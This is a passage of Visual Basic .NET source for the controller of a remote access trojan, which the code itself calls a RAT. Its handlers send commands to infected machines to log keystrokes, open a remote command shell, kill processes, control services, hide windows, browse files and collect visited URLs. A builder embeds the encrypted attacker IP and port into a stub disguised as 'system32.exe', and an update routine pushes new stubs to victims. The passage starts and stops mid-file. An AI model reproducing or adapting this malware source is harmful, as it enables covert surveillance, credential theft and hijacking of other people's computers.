                    Button50.Text = "Refresh"
                Else
                    ListView2.Items.Clear()
                    streamWriterlist(abc).WriteLine("/LISTPROC/")
                    streamWriterlist(abc).Flush()
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button48_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button48.Click
        Try
            If Connected() Then

                Dim pid As Integer = Int32.Parse(objListViewItem3.SubItems(1).Text)
                streamWriterlist(abc).WriteLine("/KILLPROC/" & pid)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button60_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button60.Click
        Try
            If Connected() Then
                ListView3.Items.Clear()
                Try
                    streamWriterlist(abc).WriteLine("/LISTSERV/")
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button59_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button59.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/STOPSERV/" & objListViewItem2.Text)
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button58_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button58.Click
        Try
            streamWriterlist(abc).WriteLine("/STRTSERV/" & objListViewItem2.Text)
            streamWriterlist(abc).Flush()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button57_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button57.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/DSBLSERV/" & objListViewItem2.Text)
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/MNULSERV/" & objListViewItem2.Text)
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button56_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button56.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/AUTOSERV/" & objListViewItem2.Text)
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button51_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button51.Click
        Try
            If Connected() Then
                List3.Items.Clear()
                Try
                    streamWriterlist(abc).WriteLine("/REFRWIND/")
                    streamWriterlist(abc).Flush()

                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button46_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button46.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/CLSEWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Dim win As Integer

    Private Sub List3_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles List3.SelectedIndexChanged
        win = List3.SelectedIndex
    End Sub

    Private Sub Button39_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button39.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/HIDEWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button52_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button52.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/MINIWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button53_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button53.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/MAXIWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button54_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button54.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/RSTRWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/DFLTWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/SHOWWIND/" & procparts.GetValue(win))
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button49_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button49.Click
        Try
            If Connected() Then
                Dim printtxt As String = TextBox12.Text.Replace(vbCrLf, "±")
                streamWriterlist(abc).WriteLine("/PRINTTXT/" & ComboBox2.Text & "¼" & printtxt)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button75_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button75.Click
        Try
            If Connected() Then
                Try
                    TextBox13.Text = Nothing
                    streamWriterlist(abc).WriteLine("/KEYSLOGG/")
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub



    Private Sub Button14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button14.Click
        Application.Exit()
    End Sub

    Private Sub Button15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button15.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Function Extract(ByRef Temp As String) As String

        Dim num As Integer
        Dim Finale As String = Nothing
        Dim appoggio As String

        For num = 1 To Len(Temp)
            appoggio = Mid(Temp, num, 1)

            If appoggio = "*" Then
                Exit For
            End If
            Finale = Mid(Temp, 1, num)
        Next num
        Extract = Finale
    End Function


    Private Sub ResetKey()
        Dim myFont As System.Drawing.Font
        myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Regular)
        Me.Button65.Text = "Make DIR"
        Me.Button65.Font = myFont
        Me.Button66.Text = "Rename"
        Me.Button66.Font = myFont
        Me.TextBox16.Visible = False
        Me.Label10.Visible = False
        Me.Button45.Text = "Upload"
        Me.Button45.Font = myFont

    End Sub

    Private Sub ExitToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem1.Click
        Application.Exit()
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        About.ShowDialog()
    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox2.SelectedIndexChanged
        Dim myFont As System.Drawing.Font

        myFont = New System.Drawing.Font("Microsoft Sans Serif", Single.Parse(ComboBox2.Text), FontStyle.Regular)
        TextBox12.Font = myFont
    End Sub

    Private Sub Button17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button17.Click
        Try
            If Connected() Then
                Try
                    streamWriterlist(abc).WriteLine("/REMOVESV/")
                    streamWriterlist(abc).Flush()
                Catch ex As Exception

                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub
    Const FileS = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
    Private Sub Button18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button18.Click
        Try

            If TextBox17.Text = "" Or TextBox19.Text = "" Then
                MessageBox.Show("You need to choose address and port to connect!!!", "#.30", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
            Dim y() As Byte
            Dim ad As String = IIf(CheckBox3.Checked, "1", "0")
            Dim test As String = Encrypt(TextBox17.Text & "*" & TextBox21.Text & "*" & TextBox19.Text & "*" & TextBox26.Text & "*" & ad, "&%#@?,:*")
            If test.Length < 150 Then
                For i As Integer = 0 To (149 - test.Length)
                    test = test & "*"
                Next
            End If

            y = StrToByteArray(test)
            Dim fff() As Byte = My.Computer.FileSystem.ReadAllBytes(Application.StartupPath & "\" & "system64.exe")


            ProgressBar2.Maximum = fff.Length
            ProgressBar2.Value = ProgressBar2.Value + 1

            ProgressBar2.Value = 0
            Dim filen As String = TextBox14.Text
            


            If TextBox14.Text = "" Then
                My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\" & "system32.exe", fff, False)

                Try
                    Dim TPath As String = Application.StartupPath & "\"
                    Dim file1, filez() As String
                    FileOpen(1, TPath & "system32.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                    file1 = Space(LOF(1))
                    FileGet(1, file1)
                    FileClose(1)
                    filez = Split(file1, FileS)
                    FileOpen(3, TPath & "1.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(3, filez(0))
                    FileClose(3)
                    FileOpen(4, TPath & "3.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(4, test)
                    FileClose(4)
                    FileOpen(5, TPath & "2.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(5, filez(1))
                    FileClose(5)

                    Dim b1() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "1.obj")
                    Dim b2() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "2.obj")
                    Dim b3() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "3.obj")
                    My.Computer.FileSystem.WriteAllBytes(TPath & "system32.exe", b1, False)
                    My.Computer.FileSystem.WriteAllBytes(TPath & "system32.exe", b3, True)
                    My.Computer.FileSystem.WriteAllBytes(TPath & "system32.exe", b2, True)
                    My.Computer.FileSystem.DeleteFile(TPath & "1.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "2.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "3.obj")
                Catch ex As Exception

                End Try
            Else
                My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\" & filen, fff, False)

                Try
                    Dim TPath As String = Application.StartupPath & "\"
                    Dim file1, filez() As String
                    FileOpen(1, TPath & TextBox14.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                    file1 = Space(LOF(1))
                    FileGet(1, file1)
                    FileClose(1)
                    filez = Split(file1, FileS)
                    FileOpen(3, TPath & "1.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(3, filez(0))
                    FileClose(3)
                    FileOpen(4, TPath & "3.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(4, test)
                    FileClose(4)
                    FileOpen(5, TPath & "2.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(5, filez(1))
                    FileClose(5)

                    Dim b1() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "1.obj")
                    Dim b2() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "2.obj")
                    Dim b3() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "3.obj")
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b1, False)
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b3, True)
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b2, True)
                    My.Computer.FileSystem.DeleteFile(TPath & "1.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "2.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "3.obj")
                Catch ex As Exception

                End Try
            End If


            Dim res As DialogResult = MessageBox.Show("Do you want to open destination folder?", "Open RAT", MessageBoxButtons.YesNo, MessageBoxIcon.Information)
            If res = Windows.Forms.DialogResult.Yes Then
                Dim MyProcess As New Process()
                MyProcess.StartInfo.FileName = "Explorer.exe"
                MyProcess.StartInfo.Arguments = Application.StartupPath
                MyProcess.Start()
            End If


        Catch ex As Exception

        End Try

    End Sub
    Private Shared Function StrToByteArray(ByVal str As String) As Byte()
        Dim encoding As New System.Text.ASCIIEncoding()
        Return encoding.GetBytes(str)
    End Function
    Private Shared Function Encrypt(ByVal strText As String, ByVal strEncrKey As String) As String
        Dim IV() As Byte = {&H12, &H34, &H56, &H78, &H90, &HAB, &HCD, &HEF}
        Try
            Dim bykey() As Byte = System.Text.Encoding.UTF8.GetBytes(Microsoft.VisualBasic.Left(strEncrKey, 8))
            Dim InputByteArray() As Byte = System.Text.Encoding.UTF8.GetBytes(strText)
            Dim des As New DESCryptoServiceProvider
            Dim ms As New MemoryStream
            Dim cs As New CryptoStream(ms, des.CreateEncryptor(bykey, IV), CryptoStreamMode.Write)
            cs.Write(InputByteArray, 0, InputByteArray.Length)
            cs.FlushFinalBlock()
            Return Convert.ToBase64String(ms.ToArray())
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Private Shared Function Decrypt(ByVal strText As String, ByVal sDecrKey As String) As String
        Try
            Dim IV() As Byte = {&H12, &H34, &H56, &H78, &H90, &HAB, &HCD, &HEF}
            Dim inputByteArray(strText.Length) As Byte

            Dim byKey() As Byte = System.Text.Encoding.UTF8.GetBytes(Microsoft.VisualBasic.Left(sDecrKey, 8))
            Dim des As New DESCryptoServiceProvider
            inputByteArray = Convert.FromBase64String(strText)
            Dim ms As New MemoryStream
            Dim cs As New CryptoStream(ms, des.CreateDecryptor(byKey, IV), CryptoStreamMode.Write)
            cs.Write(inputByteArray, 0, inputByteArray.Length)
            cs.FlushFinalBlock()
            Dim encoding As System.Text.Encoding = System.Text.Encoding.UTF8
            Return encoding.GetString(ms.ToArray())
        Catch ex As Exception
            Return Nothing
        End Try

    End Function
    Private Sub AboutToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        About.ShowDialog()
    End Sub
    Private Sub InfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfoToolStripMenuItem.Click
        INFO.ShowDialog()
    End Sub

    Private Sub Button37_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button37.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/KEYSLOGR/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button38_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button38.Click
        Dim objSaveFileDialog As New SaveFileDialog
        With objSaveFileDialog
            .DefaultExt = "txt"
            .FileName = "log"
            .Filter = "Text files (*.txt)|*.txt"
            .FilterIndex = 1
            .OverwritePrompt = True
            .Title = "Save File Dialog"
        End With

        If objSaveFileDialog.ShowDialog = Windows.Forms.DialogResult.OK Then
            Try
                Dim filePath As String
                filePath = System.IO.Path.Combine( _
                    My.Computer.FileSystem.SpecialDirectories.MyDocuments, _
                    objSaveFileDialog.FileName)
                My.Computer.FileSystem.WriteAllText(filePath, TextBox13.Text, False)
            Catch fileException As Exception
                Throw fileException
            End Try
        End If

        objSaveFileDialog.Dispose()
        objSaveFileDialog = Nothing
    End Sub

    Private Sub Button47_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button47.Click
        TextBox13.Text = Nothing
    End Sub
    Private Sub Button78_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button78.Click
        Try
            If Connected() Then
                If Button78.Text = "Start CMD" Then
                    streamWriterlist(abc).WriteLine("/STARTCMD/")
                    streamWriterlist(abc).Flush()
                    Button78.Text = "Stop CMD"
                    textBox1.Text = Nothing
                    textBox1.Text = objListViewItem1.Text & " Ready..." & vbCrLf
                Else
                    streamWriterlist(abc).WriteLine("/STOPCMD/")
                    streamWriterlist(abc).Flush()
                    Button78.Text = "Start CMD"
                End If

            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Button79_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button79.Click
        AnimateWindow(True)

    End Sub

#End Region

#Region "System Tray"
    Structure RECT
        Public left As Integer
        Public top As Integer
        Public right As Integer
        Public bottom As Integer
    End Structure

    Structure APPBARDATA
        Public cbSize As Integer
        Public hWnd As IntPtr
        Public uCallbackMessage As Integer
        Public uEdge As ABEdge
        Public rc As RECT
        Public lParam As IntPtr
    End Structure

    Enum ABMsg
        ABM_NEW = 0
        ABM_REMOVE = 1
        ABM_QUERYPOS = 2
        ABM_SETPOS = 3
        ABM_GETSTATE = 4
        ABM_GETTASKBARPOS = 5
        ABM_ACTIVATE = 6
        ABM_GETAUTOHIDEBAR = 7
        ABM_SETAUTOHIDEBAR = 8
        ABM_WINDOWPOSCHANGED = 9
        ABM_SETSTATE = 10
    End Enum

    Enum ABNotify
        ABN_STATECHANGE = 0
        ABN_POSCHANGED
        ABN_FULLSCREENAPP
        ABN_WINDOWARRANGE
    End Enum

    Enum ABEdge
        ABE_LEFT = 0
        ABE_TOP
        ABE_RIGHT
        ABE_BOTTOM
    End Enum

    Public Declare Function SHAppBarMessage Lib "shell32.dll" Alias "SHAppBarMessage" (ByVal dwMessage As Integer, ByRef pData As APPBARDATA) As Integer

    Private Const ABM_GETTASKBARPOS As Integer = &H5&
    Private Const WM_SYSCOMMAND As Integer = &H112
    Private Const SC_MINIMIZE As Integer = &HF020

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        If m.Msg = WM_SYSCOMMAND AndAlso m.WParam.ToInt32() = SC_MINIMIZE Then
            AnimateWindow(True)
            Exit Sub
        End If

        MyBase.WndProc(m)
    End Sub

    Private Sub AnimateWindow(ByVal ToTray As Boolean)
        ' get the screen dimensions
        Dim screenRect As Rectangle = Screen.GetBounds(Me.Location)

        ' figure out where the taskbar is (and consequently the tray)
        Dim destPoint As Point
        Dim BarData As APPBARDATA
        BarData.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(BarData)
        SHAppBarMessage(ABMsg.ABM_GETTASKBARPOS, BarData)
        Select Case BarData.uEdge
            Case ABEdge.ABE_BOTTOM, ABEdge.ABE_RIGHT
                ' Tray is to the Bottom Right
                destPoint = New Point(screenRect.Width, screenRect.Height)

            Case ABEdge.ABE_LEFT
                ' Tray is to the Bottom Left
                destPoint = New Point(0, screenRect.Height)

            Case ABEdge.ABE_TOP
                ' Tray is to the Top Right
                destPoint = New Point(screenRect.Width, 0)

        End Select

        ' setup our loop based on the direction
        Dim a, b, s As Single
        If ToTray Then
            a = 0
            b = 1
            s = 0.05
        Else
            a = 1
            b = 0
            s = -0.05
        End If

        ' "animate" the window
        Dim curPoint As Point, curSize As Size
        Dim startPoint As Point = Me.Location
        Dim dWidth As Integer = destPoint.X - startPoint.X
        Dim dHeight As Integer = destPoint.Y - startPoint.Y
        Dim startWidth As Integer = Me.Width
        Dim startHeight As Integer = Me.Height
        Dim i As Single
        For i = a To b Step s
            curPoint = New Point(CInt(startPoint.X + i * dWidth), CInt(startPoint.Y + i * dHeight))
            curSize = New Size(CInt((1 - i) * startWidth), CInt((1 - i) * startHeight))
            ControlPaint.DrawReversibleFrame(New Rectangle(curPoint, curSize), Me.BackColor, FrameStyle.Thick)
            System.Threading.Thread.Sleep(15)
            ControlPaint.DrawReversibleFrame(New Rectangle(curPoint, curSize), Me.BackColor, FrameStyle.Thick)
        Next

        If ToTray Then
            ' hide the form and show the notifyicon
            Me.Hide()
            Notify.Visible = True
        Else
            ' hide the notifyicon and show the form
            Notify.Visible = False
            Me.Show()
        End If
    End Sub

    Private Sub Notify_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Notify.MouseDoubleClick
        AnimateWindow(False)
    End Sub



    Private Sub Button81_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button81.Click
        If Button81.Text = "[]" Then
            Button81.Text = "]["
            Me.WindowState = FormWindowState.Maximized
        Else
            Button81.Text = "[]"
            Me.WindowState = FormWindowState.Normal
        End If
    End Sub

    Private Sub OpenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click
        AnimateWindow(False)
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Notify.Visible = False
        Application.Exit()
    End Sub

#End Region
    Private Sub Label15_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label15.TextChanged
        If Label15.Text <> "1.7G" Then
            Button82.Enabled = True
            Label15.ForeColor = Color.Red

        Else
            Button82.Enabled = False
            Label15.ForeColor = Color.Black

        End If
    End Sub

    Private patch As String
    Private Sub Button82_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button82.Click
        Try
            If Connected() Then

                If TextBox14.Text = Nothing Or TextBox17.Text = Nothing Or TextBox19.Text = Nothing Then
                    MessageBox.Show("Please fill new RAT settings such as RAT filename, at least one IP(DNS) and at least one port", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Exit Sub
                End If
                CheckBox2.Checked = False
                patch = TextBox14.Text

                Dim ad As String = IIf(CheckBox3.Checked, "1", "0")
                Dim test As String = Encrypt(TextBox17.Text & "*" & TextBox21.Text & "*" & TextBox19.Text & "*" & TextBox26.Text & "*" & ad, "&%#@?,:*")
                If test.Length < 150 Then
                    For i As Integer = 0 To (149 - test.Length)
                        test = test & "*"
                    Next
                End If
                Dim fffs As String = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\" & "ST.obj")
                Dim fff() As Byte = Convert.FromBase64String(Decrypt(fffs, "&%#@?,:*"))
                My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\" & patch, fff, False)
                Try
                    Dim TPath As String = Application.StartupPath & "\"
                    Dim file1, filez() As String
                    FileOpen(1, TPath & TextBox14.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                    file1 = Space(LOF(1))
                    FileGet(1, file1)
                    FileClose(1)
                    filez = Split(file1, FileS)
                    FileOpen(3, TPath & "1.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(3, filez(0))
                    FileClose(3)
                    FileOpen(4, TPath & "3.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(4, test)
                    FileClose(4)
                    FileOpen(5, TPath & "2.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(5, filez(1))
                    FileClose(5)

                    Dim b1() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "1.obj")
                    Dim b2() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "2.obj")
                    Dim b3() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "3.obj")
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b1, False)
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b3, True)
                    My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b2, True)
                    My.Computer.FileSystem.DeleteFile(TPath & "1.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "2.obj")
                    My.Computer.FileSystem.DeleteFile(TPath & "3.obj")
                Catch ex As Exception

                End Try
                updateflag = True

                Dim fileupload As String = Application.StartupPath & "\" & patch
                Dim build, build2 As New StringBuilder
                _index = 1
                _InputFileStram = New FileStream(fileupload, FileMode.Open, FileAccess.Read, FileShare.Read)
                _BinaryReader = New BinaryReader(_InputFileStram)
                _FileSize = _FileSize_(fileupload)
                ProgressBar1.Maximum = _FileSize
                ProgressBar1.Value = 0
                _Fragments = Math.Floor((_FileSize / ChunkSize))
                _RemainingBytes = _FileSize - (_Fragments * ChunkSize)
                _BinaryReader.BaseStream.Seek(0, SeekOrigin.Begin)
                ReDim _buffer(ChunkSize - 1)
                _BinaryReader.Read(_buffer, 0, ChunkSize)
                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                build.Append("/UPLOADFL/" & "C:\Users\Public\" & "*" & TextBox14.Text & "*")
                For i As Integer = 0 To _buffer.Length - 1
                    build2.Append(_buffer.GetValue(i).ToString & " ")
                Next
                build.Append(build2)
                streamWriterlist(abc).WriteLine(build)
                streamWriterlist(abc).Flush()
                ProgressBar1.Value = ProgressBar1.Value + (_buffer.Length - 1)
                ProgressBar1.Value = 0
            End If
        Catch ex As Exception
            _InputFileStram.Close()
            _BinaryReader.Close()
            _BinaryWriter = Nothing
            _OutputFileStram = Nothing
            _BinaryReader = Nothing
            _InputFileStram = Nothing
            streamWriterlist(abc).WriteLine("/ERROR/")
            streamWriterlist(abc).Flush()
            MessageBox.Show("The update wasn't successful", "Update", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    Private Sub ListView4_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView4.DoubleClick
        Dim objDrawingPoint As Drawing.Point

        objDrawingPoint = ListView4.PointToClient(Cursor.Position)

        If Not IsNothing(objDrawingPoint) Then
            With objDrawingPoint
                objListViewItem = ListView4.GetItemAt(.X, .Y)
            End With

            If Not IsNothing(objListViewItem) Then
                Dim appoggio, lst, drv As String
                Dim cont As Integer
                Dim lung As Integer
                Dim app As String()
                Dim reload As String = Nothing
                Try
                    If Connected() Then
                        appoggio = Mid(objListViewItem.Text, 1, 5)
                        lst = objListViewItem.Text
                        If objListViewItem.Text <> "(DIR)." Then
                            If appoggio = "(DIR)" Then
                                appoggio = Mid(objListViewItem.Text, 6, Len(objListViewItem.Text))
                                drv = PercorsoAssoluto
                                PercorsoAssoluto = PercorsoAssoluto & appoggio & "\"
                                If lst = "(DIR).." Then
                                    app = drv.Split("\")
                                    For i = 0 To (app.Length - 3)
                                        reload += app.GetValue(i) & "\"
                                    Next
                                    streamWriterlist(abc).WriteLine("/LISTDIRS/" & reload)
                                    streamWriterlist(abc).Flush()
                                    Label9.Text = reload
                                Else
                                    streamWriterlist(abc).WriteLine("/LISTDIRS/" & PercorsoAssoluto)
                                    streamWriterlist(abc).Flush()
                                End If

                                If Microsoft.VisualBasic.Right(PercorsoAssoluto, 3) = "..\" Then
                                    PercorsoAssoluto = Mid(PercorsoAssoluto, 1, Len(PercorsoAssoluto) - 4)
                                    lung = Len(PercorsoAssoluto)

                                    For cont = 1 To lung - 3
                                        PercorsoAssoluto = Mid(PercorsoAssoluto, 1, lung - cont)
                                        If Microsoft.VisualBasic.Right(PercorsoAssoluto, 1) = "\" Then Exit For
                                    Next cont
                                End If
                            Else : MessageBox.Show("You can open only Folders", "Error #7...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                            End If
                        End If
                    End If
                Catch ex As Exception

                End Try
            End If
        End If


    End Sub



    Private Sub ListView4_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView4.SelectedIndexChanged

        Try
            Dim objDrawingPoint As Drawing.Point
            Dim folder As String = Nothing
            Dim file1 As String = Nothing

            objDrawingPoint = ListView4.PointToClient(Cursor.Position)

            If Not IsNothing(objDrawingPoint) Then
                With objDrawingPoint
                    objListViewItem = ListView4.GetItemAt(.X, .Y)
                End With

                If Not IsNothing(objListViewItem) Then

                    folder = PercorsoAssoluto
                    file1 = objListViewItem.Text
                    If file1.Contains("(DIR)..") Then
                        file1 = file1.Replace("(DIR)..", "")
                    ElseIf file1.Contains("(DIR).") Then
                        file1 = file1.Replace("(DIR).", "")
                    ElseIf file1.Contains("(DIR)") Then
                        file1 = file1.Replace("(DIR)", "") & "\"
                    Else
                        file1 = objListViewItem.Text
                    End If
                    Label9.Text = folder & file1
                End If
            End If
            If file1.EndsWith("jpg") Or file1.EndsWith("jpeg") Or file1.EndsWith("png") Or file1.EndsWith("gif") Or file1.EndsWith("bmp") Or file1.EndsWith("jpg".ToUpper) Or file1.EndsWith("jpeg".ToUpper) Or file1.EndsWith("png".ToUpper) Or file1.EndsWith("gif".ToUpper) Or file1.EndsWith("bmp".ToUpper) Then
                Button70.Visible = True
            Else
                Button70.Visible = False
            End If

        Catch ex As Exception

        End Try

    End Sub

    Private Sub TreeView1_NodeMouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.TreeNodeMouseClickEventArgs) Handles TreeView1.NodeMouseClick
        If e.Button = Windows.Forms.MouseButtons.Left Then
            Dim line As String = e.Node.Name
            Select Case line
                Case "PCInfo"
                    all2()
                    PictureBox1.Visible = True
                Case "SI"
                    Try
                        If Connected() Then
                            all2()
                            GroupText.Visible = True
                            streamWriterlist(abc).WriteLine("/INFOPCPC/")
                            streamWriterlist(abc).Flush()
                        End If
                    Catch ex As Exception

                    End Try
                Case "25Last"
                    Try
                        If Connected() Then
                            all2()
                            GroupText.Visible = True
                            streamWriterlist(abc).WriteLine("/LASTURLS/")
                            streamWriterlist(abc).Flush()
                        End If
                    Catch ex As Exception

                    End Try

                Case "MSG"
                    all2()
                    GroupMSG.Visible = True
                Case "FS"
                    all2()
                    GroupStuff.Visible = True
                Case "IE"
